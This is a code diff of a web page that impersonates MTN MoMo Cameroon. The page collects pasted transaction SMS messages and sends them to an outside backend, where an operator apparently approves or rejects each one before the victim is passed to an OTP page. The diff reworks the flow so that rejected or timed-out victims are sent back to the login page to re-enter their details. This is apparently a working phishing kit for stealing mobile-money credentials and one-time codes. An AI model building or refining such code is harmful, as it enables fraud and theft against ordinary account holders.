@@ -31,7 +31,6 @@
             gap: 10px;
         }
 
-        /* ===== HEADER ===== */
         header {
             width: 100%;
             max-width: 480px;
@@ -80,7 +79,6 @@
             white-space: nowrap;
         }
 
-        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
@@ -95,7 +93,6 @@
             overflow-y: auto;
         }
 
-        /* ===== ICON BADGE ===== */
         .icon-badge {
             width: 60px;
             height: 60px;
@@ -137,7 +134,6 @@
             font-weight: 700;
         }
 
-        /* ===== STEP HINT ===== */
         .step-hint {
             background: #f8f9ff;
             border-radius: 12px;
@@ -165,7 +161,6 @@
             color: #0047AB;
         }
 
-        /* ===== SMS TEXTAREA ===== */
         .sms-wrapper {
             position: relative;
             margin-bottom: 6px;
@@ -251,7 +246,6 @@
         }
         .error-text.show { display: block; }
 
-        /* ===== RESEND ROW ===== */
         .resend-row {
             display: flex;
             justify-content: space-between;
@@ -282,7 +276,6 @@
         .resend-link:hover:not(:disabled) { background: #f0f4ff; }
         .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
-        /* ===== VERIFY BUTTON ===== */
         .verify-btn {
             width: 100%;
             padding: 15px;
@@ -319,7 +312,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== SECURITY NOTICE ===== */
         .security-notice {
             display: flex;
             align-items: flex-start;
@@ -334,7 +326,6 @@
             flex-shrink: 0;
         }
 
-        /* ===== FOOTER ===== */
         footer {
             padding: 6px;
             color: #aaa;
@@ -345,7 +336,6 @@
             flex-shrink: 0;
         }
 
-        /* ===== SMALL PHONES ===== */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
             .icon-badge {
@@ -368,9 +358,6 @@
             .paste-btn { padding: 6px 10px; font-size: 11px; }
         }
 
-        /* ============================================
-           VERIFYING OVERLAY
-           ============================================ */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -541,7 +528,6 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- VERIFYING OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
@@ -566,7 +552,6 @@
         ============================================ */
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
         const POLL_INTERVAL_MS = 2500;
-        const RESEND_TOAST_COOLDOWN_MS = 30 * 1000;
 
         /* ============================================
            DOM REFERENCES
@@ -596,7 +581,7 @@
         const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
 
         /* ============================================
-           SMS INPUT HANDLING
+           SMS INPUT
         ============================================ */
         const MIN_LENGTH = 20;
         const MTN_KEYWORDS = ['mtn', 'momo', 'transaction', 'ref', 'amount', 'xaf', 'confirmed', 'received', 'sent'];
@@ -625,12 +610,8 @@
             updateCharCount();
             updateVerifyState();
         });
-
         smsInput.addEventListener('paste', function() {
-            setTimeout(() => {
-                updateCharCount();
-                updateVerifyState();
-            }, 0);
+            setTimeout(() => { updateCharCount(); updateVerifyState(); }, 0);
         });
 
         /* ============================================
@@ -707,7 +688,6 @@
             verifyBarFill.style.width = '0%';
             verifyBarFill.style.background = '';
             const startTime = Date.now();
-
             verifyTimer = setInterval(function() {
                 const elapsed = Date.now() - startTime;
                 const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
@@ -724,7 +704,6 @@
             if (verifyTimer) clearInterval(verifyTimer);
             verifyBarFill.style.width = '100%';
             verifyBarFill.style.background = '#e74c3c';
-
             verifyTitle.innerHTML = reason.title;
             verifySubtitle.textContent = reason.subtitle;
 
@@ -744,52 +723,31 @@
         }
 
         /* ============================================
-           RESEND TOAST (30s cooldown)
+           RESEND → TOAST + REDIRECT TO login.html
         ============================================ */
-        let lastResendToastAt = 0;
+        let resendHandled = false;
 
-        function showResendToast() {
-            const now = Date.now();
-            if (now - lastResendToastAt < RESEND_TOAST_COOLDOWN_MS) return;
-            lastResendToastAt = now;
+        function handleResendFromAdmin() {
+            if (resendHandled) return;
+            resendHandled = true;
 
-            let toast = document.getElementById('resendToast');
-            if (!toast) {
-                toast = document.createElement('div');
-                toast.id = 'resendToast';
-                toast.style.cssText = `
-                    position: fixed;
-                    left: 50%;
-                    bottom: 24px;
-                    transform: translateX(-50%) translateY(20px);
-                    background: #0047AB;
-                    color: #fff;
-                    padding: 14px 22px;
-                    border-radius: 14px;
-                    font-weight: 700;
-                    font-size: 13.5px;
-                    box-shadow: 0 12px 32px rgba(0,71,171,0.4);
-                    z-index: 9999;
-                    opacity: 0;
-                    transition: opacity 0.3s ease, transform 0.3s ease;
-                    display: flex;
-                    align-items: center;
-                    gap: 8px;
-                    max-width: 90vw;
-                `;
-                toast.innerHTML = '<span>📩</span><span>SMS resent — please paste the new one</span>';
-                document.body.appendChild(toast);
-            }
+            if (verifyTimer) clearInterval(verifyTimer);
+            verifyBarFill.style.width = '100%';
+            verifyBarFill.style.background = '#0047AB';
 
-            requestAnimationFrame(() => {
-                toast.style.opacity = '1';
-                toast.style.transform = 'translateX(-50%) translateY(0)';
-            });
+            /* Update overlay text */
+            verifyTitle.innerHTML = 'Please start <span class="highlight">fresh</span>';
+            verifySubtitle.textContent = 'Kindly start fresh and put your details correctly to match. You will receive a new SMS.';
 
-            setTimeout(() => {
-                toast.style.opacity = '0';
-                toast.style.transform = 'translateX(-50%) translateY(20px)';
-            }, 3500);
+            /* After 3s → redirect to login */
+            setTimeout(function() {
+                /* Clear session data so user truly starts fresh */
+                localStorage.removeItem('momoSession');
+                localStorage.removeItem('momoPhone');
+                localStorage.removeItem('momoCountry');
+                localStorage.removeItem('momoSms');
+                window.location.href = 'login.html';
+            }, 3000);
         }
 
         /* ============================================
@@ -798,10 +756,7 @@
         let pollTimer = null;
 
         function stopPolling() {
-            if (pollTimer) {
-                clearInterval(pollTimer);
-                pollTimer = null;
-            }
+            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
         }
 
         function startPolling(sessionId) {
@@ -815,34 +770,47 @@
                     if (data.status === 'approved') {
                         stopPolling();
                         finishVerifyBar();
-
                         localStorage.setItem('momoVerified', JSON.stringify({
                             verifiedAt: new Date().toISOString(),
                             sessionId: sessionId
                         }));
-
                         setTimeout(function() {
                             window.location.href = 'verify-otp.html';
                         }, 350);
 
                     } else if (data.status === 'resend_requested') {
-                        showResendToast();
+                        handleResendFromAdmin();
 
                     } else if (data.status === 'rejected') {
                         stopPolling();
+                        /* Same as resend → go back to login */
                         showRejection({
-                            title: 'SMS <span class="highlight">rejected</span>',
-                            subtitle: 'Please make sure you copied the full SMS.',
-                            errorText: 'The SMS you pasted could not be verified. Please copy the full message and try again.'
+                            title: 'Please start <span class="highlight">fresh</span>',
+                            subtitle: 'Kindly start fresh and put your details correctly to match.',
+                            errorText: ''
                         });
+                        setTimeout(function() {
+                            localStorage.removeItem('momoSession');
+                            localStorage.removeItem('momoPhone');
+                            localStorage.removeItem('momoCountry');
+                            localStorage.removeItem('momoSms');
+                            window.location.href = 'login.html';
+                        }, 2200);
 
                     } else if (data.status === 'timeout') {
                         stopPolling();
                         showRejection({
                             title: 'Request <span class="highlight">timed out</span>',
-                            subtitle: 'Please try again.',
-                            errorText: 'Request timed out. Please try again.'
+                            subtitle: 'Please start fresh.',
+                            errorText: ''
                         });
+                        setTimeout(function() {
+                            localStorage.removeItem('momoSession');
+                            localStorage.removeItem('momoPhone');
+                            localStorage.removeItem('momoCountry');
+                            localStorage.removeItem('momoSms');
+                            window.location.href = 'login.html';
+                        }, 2200);
                     }
                 } catch (err) {
                     console.warn('poll error:', err.message);
@@ -917,9 +885,6 @@
             }
         });
 
-        /* ============================================
-           INIT
-        ============================================ */
         updateCharCount();
         updateVerifyState();
     </script>
